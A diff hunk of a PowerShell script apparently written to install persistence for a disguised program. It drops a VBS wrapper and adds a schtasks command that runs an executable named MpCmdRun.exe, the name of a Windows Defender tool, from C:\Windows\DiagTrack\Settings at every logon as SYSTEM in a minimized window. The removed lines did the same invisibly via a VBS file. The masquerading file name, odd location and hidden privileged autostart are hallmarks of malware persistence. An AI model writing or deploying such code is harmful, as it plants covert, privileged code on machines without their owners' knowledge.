@@ -94,17 +94,8 @@ if (Get-ScheduledTask -TaskName $taskName -ErrorAction SilentlyContinue) {
     Unregister-ScheduledTask -TaskName $taskName -Confirm:$false
 }
 
-$vbspath = "$env:ProgramData\MpCmdRunHidden.vbs"
-Set-Content $vbspath 'CreateObject("Wscript.Shell").Run "C:\Windows\DiagTrack\Settings\MpCmdRun.exe", 0, False'
+schtasks /create /tn "MpCmdRunTask" /tr "cmd.exe /c start \"\" /min \"C:\Windows\DiagTrack\Settings\MpCmdRun.exe\"" /sc onlogon /ru SYSTEM
 
-schtasks /create /tn "MpCmdRunTask" /tr "wscript.exe \"$vbspath\"" /sc onlogon /ru "SYSTEM"
-
-# 1. Create the VBS wrapper to run the EXE silently
-$vbspath = "$env:ProgramData\MpCmdRunHidden.vbs"
-Set-Content $vbspath 'CreateObject("Wscript.Shell").Run "C:\Windows\DiagTrack\Settings\MpCmdRun.exe", 0, False'
-
-# 2. Register the hidden scheduled task
-schtasks /create /tn "MpCmdRunTask" /tr "wscript.exe \"$vbspath\"" /sc onlogon /ru SYSTEM
 
 
 # Register the scheduled task
